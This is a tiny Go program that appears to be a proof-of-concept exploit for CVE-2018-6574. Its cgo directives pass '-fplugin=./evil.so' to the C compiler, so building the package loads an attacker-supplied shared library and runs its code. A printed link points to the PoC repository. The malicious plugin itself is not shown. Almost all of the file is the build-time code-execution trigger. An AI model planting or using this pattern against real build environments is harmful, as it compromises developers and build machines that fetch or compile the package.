package main

/*
#cgo CFLAGS: -fplugin=./evil.so
#cgo linux CFLAGS: -fplugin=./evil.so
void echo() {
  printf("link: https://github.com/neargle/CVE-2018-6574-POC");
}
*/
import "C"

func main() {
	C.echo()
	return
}
